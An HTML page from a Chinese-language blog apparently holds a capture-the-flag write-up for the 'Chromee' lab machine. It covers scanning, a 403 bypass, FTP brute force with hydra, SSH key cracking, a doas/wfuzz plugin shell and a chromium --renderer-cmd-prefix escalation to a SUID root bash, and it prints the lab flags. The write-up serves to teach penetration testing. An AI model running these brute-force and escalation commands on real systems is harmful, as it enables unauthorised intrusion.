@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 一、信息收集
+
+## 1.1 主机发现
+
+首先，在当前网段中使用`arp-scan`工具进行主机发现，寻找目标靶机。">
+<meta property="og:title" content="内部_Chromee">
+<meta property="og:description" content="# 一、信息收集
+
+## 1.1 主机发现
+
+首先，在当前网段中使用`arp-scan`工具进行主机发现，寻找目标靶机。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Chromee.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_Chromee</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Chromee</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/267" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
+<h2>1.1 主机发现</h2>
+<p>首先，在当前网段中使用<code class="notranslate">arp-scan</code>工具进行主机发现，寻找目标靶机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.138 08:00:27:9f:e7:fd       PCS Systemtechnik GmbH
+...</pre></div>
+<p>通过扫描，确定目标主机的IP地址为 <code class="notranslate">192.168.205.138</code>。</p>
+<h2>1.2 端口扫描</h2>
+<p>确认目标IP后，使用<code class="notranslate">nmap</code>进行全端口扫描，以确定目标开放了哪些服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 16:58 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.138
+Host is up (0.00024s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+8080/tcp  open  http-proxy
+23333/tcp open  elxmgmt
+MAC Address: 08:00:27:9F:E7:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+...</pre></div>
+<p>扫描结果显示目标开放了四个端口：22 (SSH)、80 (HTTP)、8080 (HTTP-Proxy) 和一个非常规端口 23333。为了识别 23333 端口上运行的具体服务，我们对其进行一次详细的服务版本扫描。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p23333 -sC -sV 192.168.205.138
+...
+PORT      STATE SERVICE VERSION
+23333/tcp open  ftp     vsftpd 3.0.3
+...
+Service Info: OS: Unix</pre></div>
+<p>详细扫描确认，23333 端口上运行的是 vsftpd 3.0.3 FTP服务。</p>
+<h1>二、Web服务探测与漏洞利用</h1>
+<h2>2.1 FTP服务初步探测</h2>
+<p>首先尝试对 23333 端口的 FTP 服务进行匿名登录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ftp anonymous@192.168.205.138 -p 23333
+...
+530 Login incorrect.
+ftp: Login failed
+...</pre></div>
+<p>匿名登录失败，暂时搁置FTP服务，转向Web服务进行探测。</p>
+<h2>2.2 Web服务信息收集</h2>
+<p>分别对 80 和 8080 端口的Web服务进行访问和目录扫描。</p>
+<ul>
+<li><strong>80端口</strong>：访问后发现是一个静态的展示页面，没有明显的交互功能。</li>
+<li><strong>8080端口</strong>：访问后返回提示 <code class="notranslate">&lt;h2&gt;You may need to bypass!&lt;/h2&gt;</code>。尝试使用 <code class="notranslate">POST</code> 请求和添加 <code class="notranslate">X-Forwarded-For</code> 头进行绕过，均未成功。</li>
+</ul>
+<p>使用 <code class="notranslate">gobuster</code> 对两个端口进行目录扫描。</p>
+<ul>
+<li><strong>80端口扫描结果</strong>：</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.205.138 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64 
+...
+/index.html           (Status: 200) [Size: 4464]
+/post.php             (Status: 200) [Size: 3]
+/secret.php           (Status: 200) [Size: 549]
+...</pre></div>
+<ul>
+<li><strong>8080端口扫描结果</strong>：</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.205.138:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64
+/index.html           (Status: 200) [Size: 33]
+/javascript           (Status: 301) [Size: 330] [--<span class="pl-k">&gt;</span> http://192.168.205.138:8080/javascript/]
+/silence              (Status: 403) [Size: 282]
+...</pre></div>
+<p>扫描发现 80 端口存在 <code class="notranslate">/secret.php</code>，8080 端口存在 <code class="notranslate">/silence</code> 目录但访问被禁止 (403 Forbidden)。</p>
+<h2>2.3 漏洞发现与信息泄露</h2>
+<p>访问 <code class="notranslate">/secret.php</code> 并查看其源代码，发现其中包含PHP代码。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-c1">.</span>.<span class="pl-c1">.</span>
+    <span class="pl-s1"><span class="pl-c1">$</span>greeting</span> = <span class="pl-en">date</span>(<span class="pl-s">'<span class="pl-s">H</span>'</span>) &lt; <span class="pl-c1">12</span> ? <span class="pl-s">'<span class="pl-s">早上好</span>'</span> : (<span class="pl-en">date</span>(<span class="pl-s">'<span class="pl-s">H</span>'</span>) &lt; <span class="pl-c1">18</span> ? <span class="pl-s">'<span class="pl-s">下午好</span>'</span> : <span class="pl-s">'<span class="pl-s">晚上好</span>'</span>);
+    <span class="pl-s1"><span class="pl-c1">$</span>visitorIP</span> = <span class="pl-en">htmlspecialchars</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">'<span class="pl-s">REMOTE_ADDR</span>'</span>]);
+
+    <span class="pl-k">echo</span> <span class="pl-s">"<span class="pl-s">&lt;h1&gt;</span>{<span class="pl-s1"><span class="pl-c1">$</span>greeting</span>}<span class="pl-s">，adriana&lt;/h1&gt;</span>"</span>;
+    <span class="pl-c1">.</span>.<span class="pl-c1">.</span>
+    <span class="pl-k">if</span> (<span class="pl-en">isset</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">aaa</span>'</span>])) {
+        <span class="pl-s1"><span class="pl-c1">$</span>file_content</span> = <span class="pl-en">file_get_contents</span>(<span class="pl-s">'<span class="pl-s">/opt/note/dic.txt</span>'</span>);
+        <span class="pl-k">echo</span> <span class="pl-s1"><span class="pl-c1">$</span>file_content</span>;
+        } <span class="pl-k">else</span> {
+                <span class="pl-en">die</span>();
+        }
+<span class="pl-c1">.</span>.<span class="pl-c1">.</span></pre></div>
+<p>从代码中获得两条关键信息：</p>
+<ol>
+<li>可能存在一个用户名为 <code class="notranslate">adriana</code>。</li>
+<li>存在一个文件读取漏洞，通过提供 <code class="notranslate">aaa</code> GET参数可以读取服务器上的 <code class="notranslate">/opt/note/dic.txt</code> 文件。</li>
+</ol>
+<h2>2.4 绕过403 Forbidden</h2>
+<p>针对 8080 端口的 <code class="notranslate">/silence</code> 目录，使用<a href="https://github.com/byt3hx/403-bypass">自动化脚本</a>尝试多种方法绕过 403 限制。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/403-bypass]
+└─$ python3 403-bypass.py -u http://192.168.205.138:8080 -p silence/
+...
+http://192.168.205.138:8080/silence/ <span class="pl-c1">:</span> (X-rewrite-url: /silence/) <span class="pl-c1">:</span> 200
+http://192.168.205.138:8080/silence/ <span class="pl-c1">:</span> Using POST: 200
+...</pre></div>
+<p>测试发现，使用 <code class="notranslate">POST</code> 方法请求可以成功绕过访问限制。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/403-bypass]
+└─$ curl -X POST http://192.168.205.138:8080/silence/
+...
+      <span class="pl-k">&lt;</span>p<span class="pl-k">&gt;</span>contact: support@chromee.hmv<span class="pl-k">&lt;</span>/p<span class="pl-k">&gt;</span>
+...</pre></div>
+<p>成功访问页面，并在页面内容中发现一个域名 <code class="notranslate">chromee.hmv</code>。将此域名与目标IP绑定到 <code class="notranslate">/etc/hosts</code> 文件中。</p>
+<h2>2.5 获取密码字典并爆破</h2>
+<p>利用前面发现的文件读取漏洞，访问 <code class="notranslate">http://chromee.hmv/secret.php?aaa</code> 来读取 <code class="notranslate">/opt/note/dic.txt</code> 的内容。</p>
+<div class="highlight highlight-text-html-basic"><pre class="notranslate">...
+The Lost Key
+
+Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.
+...</pre></div>
+<p>服务器返回了一段小故事。根据渗透测试的常见思路，故事中的名词很可能被用作密码。我们提取这些关键词，并使用 <code class="notranslate">cupp</code> 工具生成一个更丰富的密码字典，然后使用 <code class="notranslate">hydra</code> 对之前发现的 FTP 用户 <code class="notranslate">adriana</code> 进行密码爆破。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat wordlist.txt
+Lily
+curious
+key
+woods
+village
+well
+stone
+passage
+chest
+treasures
+treasure
+journey
+prize
+adventure
+reward
+rusty
+locked
+hidden
+ancient
+greatest
+LostKey
+TheLostKey
+thelostkey
+lostkey
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cupp -w wordlist.txt
+...
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ hydra -l adriana -P wordlist.txt.cupp.txt ftp://192.168.205.138:23333 -t 64
+...
+[23333][ftp] host: 192.168.205.138   login: adriana   password: Lily2020
+[STATUS] attack finished <span class="pl-k">for</span> 192.168.205.138 (valid pair found)
+...</pre></div>
+<p>成功爆破出 FTP 凭证：<code class="notranslate">adriana:Lily2020</code>。</p>
+<h1>三、横向移动与权限提升</h1>
+<h2>3.1 登录FTP并发现私钥</h2>
+<p>使用破解的凭证登录FTP服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ftp adriana@192.168.205.138 -p 23333
+Password:
+230 Login successful.
+...
+ftp<span class="pl-k">&gt;</span> ls -la
+...
+-rw-r--r--    1 0        0            3414 Mar 09  2025 ...
+-rw-r--r--    1 0        0             495 Mar 07  2025 dic.txt
+...</pre></div>
+<p>发现一个名为 <code class="notranslate">...</code> 的可疑文件。使用 <code class="notranslate">wget</code> 将其下载到本地，经过查看<code class="notranslate">...</code>是ssh私钥。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/tmp]
+└─$ wget -r ftp://adriana:Lily2020@192.168.205.138:23333/
+...</pre></div>
+<h2>3.2 破解私钥密码</h2>
+<p>将下载的文件重命名为 <code class="notranslate">id_rsa</code> 并设置正确权限，然后使用 <code class="notranslate">ssh2john</code> 和 <code class="notranslate">john</code> 对私钥的密码进行破解。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/tmp/192.168.205.138:23333]
+└─$ mv ... id_rsa
+└─$ chmod 600 id_rsa
+└─$ ssh2john id_rsa <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span>
+...
+cassandra        (id_rsa)
+...
+Session completed.</pre></div>
+<p>成功破解私钥的密码为 <code class="notranslate">cassandra</code>。</p>
+<h2>3.3 登录SSH并枚举</h2>
+<p>再次登录FTP，通过目录遍历在 <code class="notranslate">/home</code> 目录下发现了 <code class="notranslate">follower</code> 和 <code class="notranslate">softly</code> 两个用户。尝试使用破解的私钥以 <code class="notranslate">follower</code> 用户身份登录 SSH。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/tmp/192.168.205.138:23333]
+└─$ ssh follower@192.168.205.138 -i id_rsa
+Enter passphrase <span class="pl-k">for</span> key <span class="pl-s"><span class="pl-pds">'</span>id_rsa<span class="pl-pds">'</span></span>:
+follower@Chromee:<span class="pl-k">~</span>$ id
+uid=1000(follower) gid=1000(follower) grupos=1000(follower)</pre></div>
+<p>成功登录。检查 <code class="notranslate">sudo</code> 权限失败后，查找具有 SUID 权限的二进制文件，发现了一个非标准的 <code class="notranslate">doas</code> 程序。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">follower@Chromee:<span class="pl-k">~</span>$ find / -perm -4000 -type f -exec ls -l {} <span class="pl-cce">\;</span> <span class="pl-k">2&gt;</span>/dev/null
+...
+-rwsr-xr-x 1 root root 42352 mar  7  2025 /usr/local/bin/doas
+...</pre></div>
+<h2>3.4 Doas配置分析与提权至softly</h2>
+<p><code class="notranslate">doas</code> 是 <code class="notranslate">sudo</code> 的一个轻量级替代品。通过在系统中搜索近期修改的文件，最终在 <code class="notranslate">/srv/zeus.conf</code> 找到了其配置文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">follower@Chromee:/tmp$ cat /srv/zeus.conf
+permit follower as softly cmd /usr/local/bin/wfuzz
+permit nopass :softly as root cmd /usr/bin/chromium
+permit nopass :softly as root cmd /usr/bin/kill</pre></div>
+<p>配置文件显示，<code class="notranslate">follower</code> 用户可以作为 <code class="notranslate">softly</code> 用户执行 <code class="notranslate">/usr/local/bin/wfuzz</code>。同时，在 <code class="notranslate">follower</code> 的家目录下发现 <code class="notranslate">note.txt</code>，提示与ROT47相关。通过对 <code class="notranslate">cat.gif</code> 文件进行隐写分析，提取其帧延迟时间序列进行ROT47解码，最终得到 <code class="notranslate">softly</code> 用户的密码：<code class="notranslate">p3p573r</code>。</p>
+<p><em>ps:<a href="https://blog.csdn.net/CHTXRT/article/details/128728967" rel="nofollow">https://blog.csdn.net/CHTXRT/article/details/128728967</a></em></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ae07eb15616e2da1b11a785ca18dfe26ac7bf4ef9eded7a1c0c50b158b3db94b/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393139343931363035372e77656270"><img src="https://camo.githubusercontent.com/ae07eb15616e2da1b11a785ca18dfe26ac7bf4ef9eded7a1c0c50b158b3db94b/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393139343931363035372e77656270" alt="image-20251019180141537" data-canonical-src="http://7r1UMPHK.github.io/image/20251019194916057.webp" style="max-width: 100%;"></a></p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ identify -format "%s %T n" cat.gif
+0 65 n1 98 n2 65 n3 100 n4 102 n5 98 n6 67 n7 6 n8 6 n9 6 n10 6 n11 6 n12 6 n                                                                           
+</code></pre>
+<p>延迟时间序列：<code class="notranslate">65 98 65 100 102 98 67 6 6 6 6 6 6</code></p>
+<p><a href="https://gchq.github.io/CyberChef" rel="nofollow">https://gchq.github.io/CyberChef</a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e507418eeab93247640879f7731b663e99ef7e9c3087b711c71f226b3257bc2a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393139343931383334302e77656270"><img src="https://camo.githubusercontent.com/e507418eeab93247640879f7731b663e99ef7e9c3087b711c71f226b3257bc2a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235313031393139343931383334302e77656270" alt="image-20251019180519820" data-canonical-src="http://7r1UMPHK.github.io/image/20251019194918340.webp" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">follower@Chromee:<span class="pl-k">~</span>$ doas -u softly /usr/local/bin/wfuzz --help
+Password: p3p573r
+...
+<span class="pl-c"><span class="pl-c">#</span> 成功执行</span></pre></div>
+<p>我们发现 <code class="notranslate">wfuzz</code> 的一个插件文件 <code class="notranslate">/usr/local/lib/python3.9/dist-packages/wfuzz/plugins/payloads/file.py</code> 对当前用户可写。经过查看发现<code class="notranslate">file.py</code>文件已经被修改成了<code class="notranslate">pty.spawn("/bin/bash")</code>，那我们可以通过 <code class="notranslate">doas</code> 以 <code class="notranslate">softly</code> 用户的身份执行 <code class="notranslate">wfuzz</code> 来触发代码，从而获得 <code class="notranslate">softly</code> 的shell。</p>
+<pre class="notranslate"><code class="notranslate">ollower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz -w /home/softly/.ssh/id_rsa -u 127.0.0.1
+Password: 
+ /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+softly@Chromee:/home/follower$ id
+uid=1001(softly) gid=1001(softly) groups=1001(softly)
+</code></pre>
+<p>为了获得一个稳定的交互式Shell，我们选择写入自己的SSH公钥到 <code class="notranslate">softly</code> 用户的 <code class="notranslate">authorized_keys</code> 文件中。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">softly@Chromee:<span class="pl-k">~</span>$ mkdir .ssh
+softly@Chromee:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>ssh-rsa AAAAB...<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-k">~</span>/.ssh/authorized_keys</pre></div>
+<p>之后，便可从kali直接免密登录 <code class="notranslate">softly</code> 账户。</p>
+<h2>3.5 提权至root</h2>
+<p>登录 <code class="notranslate">softly</code> 账户后，再次分析 <code class="notranslate">doas</code> 配置文件，发现 <code class="notranslate">softly</code> 用户可以无密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/usr/bin/chromium</code>。</p>
+<pre class="notranslate"><code class="notranslate">permit nopass :softly as root cmd /usr/bin/chromium
+</code></pre>
+<p>Chromium/Chrome 浏览器存在一个已知的提权技巧，即利用 <code class="notranslate">--renderer-cmd-prefix</code> 参数在沙箱外以更高权限执行命令。我们创建一个脚本 <code class="notranslate">/tmp/pwn.sh</code>，内容为复制 <code class="notranslate">bash</code> 并为其添加 SUID 权限位。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">softly@Chromee:/tmp$ cat <span class="pl-k">&gt;</span> /tmp/pwn.sh <span class="pl-s"><span class="pl-k">&lt;&lt;</span> <span class="pl-k">EOF</span></span>
+<span class="pl-s">#!/bin/bash</span>
+<span class="pl-s">cp /bin/bash /tmp/rootbash</span>
+<span class="pl-s">chmod 4755 /tmp/rootbash</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span>
+softly@Chromee:/tmp$ chmod +x /tmp/pwn.sh</pre></div>
+<p>现在，以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">chromium</code> 并指定我们的恶意脚本。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">softly@Chromee:/tmp$ doas -u root /usr/bin/chromium --headless --no-sandbox --renderer-cmd-prefix=<span class="pl-s"><span class="pl-pds">"</span>/tmp/pwn.sh<span class="pl-pds">"</span></span>
+...</pre></div>
+<p>命令执行后，检查 <code class="notranslate">/tmp</code> 目录，发现已成功创建了一个带有 SUID 权限的 <code class="notranslate">rootbash</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">softly@Chromee:/tmp$ ls -la /tmp/rootbash
+-rwsr-xr-x  1 root     root     1234376 oct 19 13:23 /tmp/rootbash</pre></div>
+<p>执行此文件，即可获得 <code class="notranslate">root</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">softly@Chromee:/tmp$ ./rootbash -p
+rootbash-5.1# id
+uid=1001(softly) gid=1001(softly) euid=0(root) grupos=1001(softly)</pre></div>
+<h2>3.6 获取Flag</h2>
+<p>成功提权至 <code class="notranslate">root</code>，现在可以读取所有flag文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rootbash-5.1# cat /home/softly/user.txt
+flag{c5dbe81aac6438c522d2f79cc7255e6a}
+
+rootbash-5.1# cat /root/root.txt
+flag{e96f7a29ba633b4e43214b43d1791074}</pre></div>
+<p>至此，渗透测试完成。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
